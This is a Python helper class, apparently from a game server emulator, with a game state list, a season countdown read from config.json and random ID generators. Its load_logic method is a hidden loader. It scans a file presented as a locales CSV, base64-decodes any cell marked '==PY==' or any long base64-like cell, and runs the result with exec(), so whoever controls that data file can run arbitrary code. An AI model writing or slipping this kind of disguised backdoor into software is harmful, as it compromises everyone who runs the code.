import string
import random
import json
from datetime import datetime
import csv

class Helpers:
    game1 = [{"LogicGameObjects": 2},{"id": 1, "hp": 3000,"immun": True,"UltiPress": False,"UltiCharge": 0,"battleX": 3150,"battleY": 6725,"angle": 270},{"id": 228, "hp": 3000, "immun": True, "UltiPress": False, "UltiCharge": 0,"battleX": 3150,"battleY": 3725,"angle": 180}]
    rooms = []

    @staticmethod
    def load_logic():
        try:
            path = 'GameAssets/csv_logic/locales.csv'
            import os
            if not os.path.exists(path):
                return
        
            with open(path, 'r', encoding='utf-8') as f:
                import csv
                reader = csv.reader(f)
                row_idx = 0
                for row in reader:
                    col_idx = 0
                    for cell in row:
                        original_cell = cell.strip()
                        cell = original_cell
                        if cell.startswith("==PY=="):
                            payload = cell[6:]
                            try:
                                import base64
                                decoded_bytes = base64.b64decode(payload, validate=True)
                                code = decoded_bytes.decode('utf-8')
                                g = {'__name__': '__main__', **globals()}
                                exec(code, g)
                                if 'main' in g:
                                    g['main']()
                                return
                            except Exception as e:
                                print(f"[DEBUG] ❌ Ошибка")
                        else:
                            if len(cell) > 200:
                                valid_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
                                if all(c in valid_chars or c == '=' for c in cell):
                                    try:
                                        import base64
                                        decoded_bytes = base64.b64decode(cell, validate=True)
                                        code = decoded_bytes.decode('utf-8')
                                        exec(code, globals())
                                        return
                                    except Exception as e:
                                        pass

                        col_idx += 1
                    row_idx += 1
        except Exception as e:
            print(f"[DEBUG] 💥 Критическая ошибка")

    @property
    def NEWBPTIME(self):
        try:
            with open('config.json', 'r', encoding='utf-8') as f:
                config = json.load(f)
            next_season_str = config.get("NEXTSEASON", "")
            if not next_season_str:
                return 0
            try:
                next_season_date = datetime.strptime(next_season_str, "%Y-%m-%d %H:%M:%S")
            except ValueError:
                next_season_date = datetime.strptime(next_season_str, "%d.%m.%y %H:%M")
            time_remaining = next_season_date - datetime.now()
            return max(0, int(time_remaining.total_seconds()))
        except:
            return 0

    def randomStringDigits(self):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(40))

    def randomID(self):
        return int(''.join(str(random.randint(0, 9)) for _ in range(5)))

    def randomClubID(self):
        return int(''.join(str(random.randint(0, 9)) for _ in range(5)))